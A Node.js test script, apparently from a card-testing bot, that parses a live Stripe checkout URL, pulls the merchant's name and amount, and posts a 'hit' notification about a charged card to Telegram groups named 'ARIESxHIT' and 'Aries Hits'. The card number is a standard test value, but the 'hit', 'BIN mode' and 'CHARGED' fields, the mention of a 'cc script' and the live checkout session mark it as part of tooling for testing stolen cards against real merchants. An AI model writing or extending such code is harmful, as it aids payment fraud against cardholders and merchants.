// Test hit notification for the provided checkout URL
const { sendHitToGroups } = require('./services/telegramService');
const checkoutService = require('./services/checkoutService');

const checkoutUrl = 'https://checkout.stripe.com/c/pay/cs_live_b1o4OlWHxqOWCbyXtU05n23vQDEHsucPFFcv2zME7OsK4iqeZiAONxCYvZ#fidnandhYHdWcXxpYCc%2FJ2FgY2RwaXEnKSd2cGd2ZndsdXFsamtQa2x0cGBrYHZ2QGtkZ2lgYSc%2FY2RpdmApJ2R1bE5gfCc%2FJ3VuWmlsc2BaMDQwXHVLdk9EaGtcU0pzY2t2R3RXYURRUlYzVn9nS0R2aUp%2FNH83cXBvYU5wc1dIQURyUkhgQ111M2FPSTRcTld3VG9HNVJEdTVQQUJyaUNcSTJtfXIyQ2Y1NVRuY31HQ3ZJJyknY3dqaFZgd3Ngdyc%2FcXdwYCknZ2RmbmJ3anBrYUZqaWp3Jz8nJjc2NzA3YycpJ2lkfGpwcVF8dWAnPydocGlxbFpscWBoJyknYGtkZ2lgVWlkZmBtamlhYHd2Jz9xd3BgeCUl';

async function testHitForUrl() {
  console.log('🎯 Testing Hit Notification for Checkout URL');
  console.log('============================================\n');

  console.log('📋 Checkout URL:');
  console.log(checkoutUrl);
  console.log('');

  try {
    // Parse the URL to get session ID and public key
    const parsed = checkoutService.parseCheckoutUrl(checkoutUrl);
    console.log('🔍 Parsed URL Data:');
    console.log('   Session ID:', parsed.sessionId);
    console.log('   Public Key:', parsed.publicKey ? parsed.publicKey.substring(0, 30) + '...' : 'null');

    if (!parsed.sessionId || !parsed.publicKey) {
      console.log('❌ Could not parse checkout URL');
      return;
    }

    // Try to fetch checkout data to extract merchant info
    console.log('\n🛡️  Attempting to fetch checkout data...');
    try {
      const info = await checkoutService.fetchCheckoutInfo(parsed.sessionId, parsed.publicKey);

      if (info.error) {
        console.log('❌ API Error:', info.error.message);
        console.log('❌ Using mock data for demonstration');
      } else {
        console.log('✅ Checkout data fetched successfully');
      }

      // Extract merchant data
      const checkoutData = checkoutService.getAmountAndCurrency(info);
      console.log('\n💰 Extracted Checkout Data:');
      console.log('   Amount:', checkoutData.amount ? `$${(checkoutData.amount / 100).toFixed(2)}` : 'null');
      console.log('   Currency:', checkoutData.currency || 'null');
      console.log('   Business Name:', checkoutData.businessName || 'null');
      console.log('   Business URL:', checkoutData.businessUrl || 'null');

      // Get merchant name (like cc script)
      let merchantName = 'Unknown';
      if (checkoutData.businessName) {
        merchantName = checkoutData.businessName;
      } else if (checkoutData.businessUrl) {
        merchantName = checkoutData.businessUrl.replace(/^https?:\/\//, '').replace(/\/$/, '');
      }

      console.log('\n🏪 Final Merchant Name:', merchantName);

      // Create hit data for this successful checkout
      const hitData = {
        userId: '6447766151',
        userName: 'Test User',
        card: '4111111111111111', // Test card
        bin: '411111',
        binMode: false,
        amount: checkoutData.amount ? (checkoutData.amount / 100).toFixed(2) : '9.99',
        currency: checkoutData.currency || 'USD',
        attempts: 1,
        timeTaken: '2.5s',
        merchant: merchantName, // Use extracted merchant name
        businessUrl: checkoutData.businessUrl || merchantName,
        currentUrl: checkoutUrl,
        email: 'test@example.com',
        status: 'CHARGED',
        timestamp: new Date().toISOString()
      };

      console.log('\n🎯 Hit Data Prepared:');
      console.log('================================');
      console.log('User:', `${hitData.userName} (${hitData.userId})`);
      console.log('Card:', hitData.card);
      console.log('Amount:', `$${hitData.amount} ${hitData.currency}`);
      console.log('Merchant:', hitData.merchant);
      console.log('Business URL:', hitData.businessUrl);
      console.log('Status:', hitData.status);
      console.log('');

      console.log('📤 Sending Hit Notifications...');
      console.log('================================');

      // Send to both groups
      await sendHitToGroups(hitData, checkoutUrl);

      console.log('\n✅ SUCCESS! Hit notifications sent!');
      console.log('=====================================');
      console.log('✅ ARIESxHIT Chat: Received hit notification');
      console.log('✅ Aries Hits: Received detailed hit notification');
      console.log('✅ Merchant: Shows extracted business name');
      console.log('✅ Business: Shows extracted business URL/name');

    } catch (fetchError) {
      console.log('❌ Could not fetch checkout data:', fetchError.message);
      console.log('\n💡 Proceeding with mock data for demonstration...');

      // Create hit data with mock merchant info
      const hitData = {
        userId: '6447766151',
        userName: 'Test User',
        card: '4111111111111111',
        bin: '411111',
        binMode: false,
        amount: '9.99',
        currency: 'USD',
        attempts: 1,
        timeTaken: '2.5s',
        merchant: 'Extracted Merchant', // Would be real merchant from checkout
        businessUrl: 'https://extracted-business.com',
        currentUrl: checkoutUrl,
        email: 'test@example.com',
        status: 'CHARGED',
        timestamp: new Date().toISOString()
      };

      console.log('\n🎯 Sending Hit Notifications with Mock Data...');
      await sendHitToGroups(hitData, checkoutUrl);

      console.log('\n✅ Mock hit notifications sent!');
      console.log('📝 In real scenario, merchant would be extracted from checkout data');
    }

  } catch (error) {
    console.error('❌ Error during hit test:', error.message);
  }
}

testHitForUrl();